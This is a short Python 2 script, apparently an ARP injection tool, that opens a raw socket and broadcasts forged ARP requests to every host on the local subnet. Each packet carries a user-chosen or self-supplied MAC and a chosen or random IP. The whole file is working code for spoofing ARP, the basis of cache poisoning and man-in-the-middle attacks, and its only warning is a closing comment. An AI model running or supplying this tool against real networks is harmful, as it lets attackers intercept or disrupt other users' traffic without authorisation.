#!/usr/bin/env python
import socket
import binascii
import struct
import pcapy
import netifaces as ni
import netaddr
import random


def notation(netmask):
        binary_str = ''
        for octet in netmask:
                binary_str += bin(int(octet))[2:].zfill(8)
        return str(len(binary_str.rstrip('0')))



#list all interfaces
devices = pcapy.findalldevs()
print "Available devices are:"
for d in devices :
        print d

dev = raw_input("Enter interface name to inject ARP:: ") 

#MAC Addr choose
mac = raw_input("\nEnter the target MAC-Addr in 00:11:22:33:44:55 format\n\
or just press enter to bind packet with your own MAC-Addr = ")

#bind socket to the interface
raw = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
raw.bind((dev, socket.htons(0x0800)))


#get ip address, netmask and MAC-addr of interface
ipaddr = ni.ifaddresses(dev)[2][0]['addr']
netmask = ni.ifaddresses(dev)[2][0]['netmask']

if len(mac) == 17:
        s_mac = mac
elif mac is '':
        s_mac = ni.ifaddresses(dev)[17][0]['addr']
        print "Binding with %s interface MAC" %dev
else :
        s_mac = ni.ifaddresses(dev)[17][0]['addr']
        print "\nillegal MAC format, binding with interface MAC :P\n"

s_mac_hex = binascii.unhexlify(s_mac.replace(':',''))

netID = ipaddr+'/'+notation(netmask.split('.'))

#list of network range
net_range =  list(netaddr.IPNetwork(netID))

#remove network ID and Broadcast Addr from list
del net_range[0]
net_range.pop()

if s_mac == mac:
        ip_input = raw_input("Enter target IP or press return to choose at random : ")
        if ip_input == '':
                ip_random = random.sample(net_range, 1)
                ipaddr = str(ip_random[0])
        else :
                ipaddr = ip_input

#removing self ip from range
s_ipaddr = ipaddr.split('.')
net_range.pop(int(s_ipaddr[3]))

ip_hex = socket.inet_aton(ipaddr)

print "Injecting ARP packets with %s MAC, target IP %s on %s interface\n" %(s_mac, ipaddr, dev) 

for i in net_range:

        hex_ip = socket.inet_aton(str(i))
        packet = struct.pack("!6s6s2s2s2s1s1s2s6s4s6s4s","\xff\xff\xff\xff\xff\xff",\
s_mac_hex,"\x08\x06","\x00\x01","\x08\x00","\x06","\x04",\
"\x00\x01", s_mac_hex,ip_hex , "\x00\x00\x00\x00\x00\x00", hex_ip)
        raw.send(packet)
        #print "current IP"+str(i)





'''
This script will inject ARP requests into network.

make sure you provide correct MAC & IP format. because it just verifies length not format

use at ur own risk if your network notation is less than 22

'''
